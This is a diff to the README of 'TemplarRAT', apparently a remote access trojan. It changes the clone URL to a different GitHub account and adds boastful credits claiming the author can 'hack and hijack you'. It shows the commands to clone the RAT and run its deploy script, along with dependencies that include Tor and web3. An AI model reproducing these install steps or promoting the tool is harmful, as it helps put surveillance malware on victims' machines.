@@ -45,7 +45,7 @@ pip install web3 stem flask-socketio cryptography
 Installation
 
 ```bash
-git clone https://github.com/BeduSec/TemplarRAT.git
+git clone https://github.com/Malengoall/TemplarRAT
 cd TemplarRAT
 chmod +x deploy.sh
 ./deploy.sh
@@ -106,3 +106,8 @@ If you find this project useful, please give it a star!
 
 Creator: Malengoall 😈 | Version: 2.0 | License: GPL-3.0
 
+Contribute Malengoall Tech , Cyber Blue and Zisco Hacker😈😈
+Don’t forget to mention me in your prayers and duas.  
+Call me *MALENGOALL TECH* — *I'm not a hacker, but I know how to hack and hijack you* 👿👿
+
+MALENGOALL tt
